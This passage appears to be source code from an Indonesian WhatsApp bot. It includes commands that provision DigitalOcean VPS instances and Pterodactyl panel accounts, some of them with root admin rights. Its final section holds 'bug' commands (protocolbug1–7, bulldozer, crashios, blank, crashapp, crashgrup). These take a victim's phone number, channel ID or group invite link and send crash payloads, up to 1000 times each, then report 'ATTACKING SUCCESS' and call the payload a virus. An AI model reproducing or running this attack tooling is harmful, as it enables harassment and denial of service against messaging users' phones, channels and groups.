if (!isCreator) return ReplyButton(mess.owner); 

const dropletInfo = await getDropletInfo();
ReplyButton(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
ReplyButton(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break;
// Function to generate a random password
function generateRandomPassword(length = 12) {
 const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 let password = "";
 for (let i = 0; i < length; i++) {
 const randomIndex = Math.floor(Math.random() * charset.length);
 password += charset[randomIndex];
 }
 return password;
}

case "vps1g1c": case "vps2g1c": case "vps2g2c": case "vps4g2c": case "vps8g4c": case "vps16g4c": {
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return ReplyButton(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await ReplyButton(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apido
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await client.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        ReplyButton(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

// Function to generate a random password
function generateRandomPassword(length = 12) {
 const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 let password = "";
 for (let i = 0; i < length; i++) {
 const randomIndex = Math.floor(Math.random() * charset.length);
 password += charset[randomIndex];
 }
 return password;
}

case "createvps": {
  if (!isCreator) return ReplyButton(mess.owner);

  const args = text.split(' '); // Memisahkan argumen berdasarkan spasi
  const hostname = args[0]; // Nama host
  const sizeOption = args[1]; // Ukuran VPS
  const osOption = args[2] || "ubuntu"; // Default: Ubuntu
  const osVersionOption = args[3] || "20-04"; // Default: Ubuntu 20.04
  const regionOption = args[4] || "sgp1"; // Default: Singapore

  // Validasi argumen
  if (!hostname || !sizeOption) {
    return ReplyButton(
      `*Format argumen salah!*\nCONTOH: ${prefix + command} namahostmu vps16g4c ubuntu 20-04 sgp1\n\n` +
      `*Opsi yang tersedia:*\n` +
      `- Ukuran VPS: vps1g1c, vps2g1c, vps2g2c, vps4g2c, vps8g4c, vps16g4c\n` +
      `- OS: ubuntu, debian, centos, fedora\n` +
      `- Versi OS:\n  Ubuntu: 20-04, 22-04\n  Debian: 10, 11\n  CentOS: 7, 8\n  Fedora: 34, 35\n` +
      `- Region: sgp1, nyc3, ams3, lon1, fra1, sfo1, blr1, tor1`
    );
  }

  // Peta OS dan Versi
  const osMap = {
    ubuntu: { '20-04': 'ubuntu-20-04-x64', '22-04': 'ubuntu-22-04-x64' },
    debian: { '10': 'debian-10-x64', '11': 'debian-11-x64' },
    centos: { '8': 'centos-8-x64', '7': 'centos-7-x64' },
    fedora: { '34': 'fedora-34-x64', '35': 'fedora-35-x64' },
  };

  if (!osMap[osOption]) {
    return ReplyButton(`*OS tidak valid!*\nOS yang tersedia: ubuntu, debian, centos, fedora.`);
  }
  if (!osMap[osOption][osVersionOption]) {
    return ReplyButton(
      `*Versi OS tidak valid!*\nVersi yang tersedia untuk ${osOption}: ${Object.keys(osMap[osOption]).join(', ')}`
    );
  }

  // Peta Ukuran
  const sizeMap = {
    vps1g1c: 's-1vcpu-1gb',
    vps2g1c: 's-1vcpu-2gb',
    vps2g2c: 's-2vcpu-2gb',
    vps4g2c: 's-2vcpu-4gb',
    vps8g4c: 's-4vcpu-8gb',
    vps16g4c: 's-4vcpu-16gb-amd',
  };

  if (!sizeMap[sizeOption]) {
    return ReplyButton(`*Ukuran VPS tidak valid!*\nUkuran yang tersedia: ${Object.keys(sizeMap).join(', ')}`);
  }

  // Peta Region
  const regionMap = {
    sgp1: 'Singapore (SGP1)',
    nyc3: 'New York (NYC3)',
    ams3: 'Amsterdam (AMS3)',
    lon1: 'London (LON1)',
    fra1: 'Frankfurt (FRA1)',
    sfo1: 'San Francisco (SFO1)',
    blr1: 'Bangalore (BLR1)',
    tor1: 'Toronto (TOR1)',
  };

  if (!regionMap[regionOption]) {
    return ReplyButton(`*Region tidak valid!*\nRegion yang tersedia: ${Object.keys(regionMap).join(', ')}`);
  }

  try {
    // Data untuk membuat droplet
    let dropletData = {
      name: hostname.toLowerCase(),
      region: regionOption,
      size: sizeMap[sizeOption],
      image: osMap[osOption][osVersionOption],
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T'],
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + global.apido,
      },
      body: JSON.stringify(dropletData),
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      await ReplyButton(`Memproses pembuatan VPS...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer ' + global.apido,
        },
      });

      let dropletDetails = await dropletResponse.json();
      let ipVPS =
        dropletDetails.droplet.networks.v4 && dropletDetails.droplet.networks.v4.length > 0
          ? dropletDetails.droplet.networks.v4[0].ip_address
          : 'Tidak ada alamat IP yang tersedia';

      let messageText = `VPS berhasil dibuat!\n\n`;
      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}`;

      await client.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    ReplyButton(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
  }
}
//=================================================//
// Command Panel
//=================================================//

break
case "delpanel": case "hapuspanel": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (!isCreator) return ReplyButton(mess.owner);
if (global.apikey.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!args[0]) return ReplyButton(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return ReplyButton("*ID Server/User* Tidak Ditemukan")
ReplyButton(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
/*==============================================*/
        case "deladmin": {
  if (!isCreator) return ReplyButton(mess.owner);
let usr = args[0]
if (!usr) return ReplyButton('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return ReplyButton('*USER NOT FOUND*')
ReplyButton('*SUCCESSFULLY DELETE ADMIN*')
}
break
/*==============================================*/
case "listadmin": {
  if (!isCreator) return ReplyButton(mess.owner);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await client.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    ReplyButton(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
/*==============================================*/
case "listpanel": case "listp": case "listserver": {
await client.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (global.apikey.length < 1) return ReplyButton("Apikey Tidak Ditemukan!")
if (!isCreator) return ReplyButton(mess.owner);
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyButton("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Status : *${status}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await client.sendMessage(m.chat, { text: messageText }, { quoted: qtext })
}
break
/*==============================================*/
case "cadmin": {
let desc = tanggal(Date.now())
if (!isCreator) return ReplyButton(mess.owner);
if (!text) return ReplyButton(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* dilarang intip panel orang
* dilarang otak atik panel
* dilarang ganti nama panel
* dilarang ambil sc orang
* dilarang create admin panel
* dilarang otak atik nodejs
* dilarang otak atik apa pun
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
KALO GA PAHAM LIAT YT JANGAN NEKAT 
BIKIN ASAL ASALAN KARENA KALO SALAH
BAKALAN DI DELET TRX NO REFF NO KOMEN


*NOTE* :
*OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
}
break
/*==============================================*/
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isPremium && !isCreator) return ReplyButton(mess.premium);
if (!text) return ReplyButton(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyButton(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyButton(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyButton("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
//=================================================//
// Command Bug
//=================================================//

break
case 'protocolbug1': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug1 : ${i}/1000
target : ${target}`));
await protocolbug1(client, target, false)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'protocolbug2': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug2 : ${i}/1000
target : ${target}`));
await protocolbug2(client, target, false)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'protocolbug3': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug3 : ${i}/1000
target : ${target}`));
await protocolbug3(client, target, false)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'protocolbug5': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug5 : ${i}/1000
target : ${target}`));
await protocolbug5(client, target, false)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'protocolbug6': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug6 : ${i}/1000
target : ${target}`));
await protocolbug6(client, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'protocolbug7': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Protocolbug7 : ${i}/1000
target : ${target}`));
await protocolbug7(client, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'bulldozer': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Bulldozer : ${i}/1000
target : ${target}`));
await bulldozer(client, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}

//=================================================//
// Command Vvip
//=================================================//
break
case 'crashios': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 50; i++) {
console.log(chalk.green(`© CrashIoS : ${i}/50
target : ${target}`));
await TrashLocIOS(client, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'blank': {
  try {
    if (!isCreator && !isPremium) return ReplyButton(mess.premium);
    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1; i++) {
console.log(chalk.green(`© Blank : ${i}/1
target : ${target}`));
await invico2(client, target)
await letterCrash(client, target)
await StickerPack6(client, target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number is valid.");
}
}

break
case 'crashch':
case 'crashapp': {
    if (!isCreator && !isPremium) return ReplyButton("*You are not a Premium User*");
    if (!q) return ReplyButton(example("120363xxxxxxx"))

    if (!/^\d{15,}$/.test(q)) return ReplyButton("❌ Gunakan hanya ID channel yang valid (120363xxxxxxx)");

    let target = `${q}@newsletter`;

    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${target}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`;
    ReplyButton(teks);
    ////////// Sending Bugs //////////
    for (let i = 0; i < 1; i++) {
    console.log(chalk.green(`© CrashApp : ${i}/1
target : ${target}`));
    await buttoncast(client, target);
    await payoutzep(client, target);
    await pendingpay(client, target);
    }
    ////////// Succes Bugs //////////
}
break
case 'frezegrup':
case 'crashgrup': {
  if (!isCreator && !isPremium) return ReplyButton(mess.owner);
  if (!q) return ReplyButton(example("https://chat.whatsapp.com/"));

  try {
    await sleep(1000);
    ReplyButton(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await client.groupAcceptInvite(result);

////////// Sending Bugs //////////
for (let i = 0; i < 1; i++) {
console.log(chalk.green(`© FrezeGrup : ${i}/1
target : ${target}`));
await GroupFreze(client, target);
await spack2(client, target);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyButton("Failed to send virus. Make sure the number or link is valid.");
  }
}
break
case "dev":
case "devoloper":
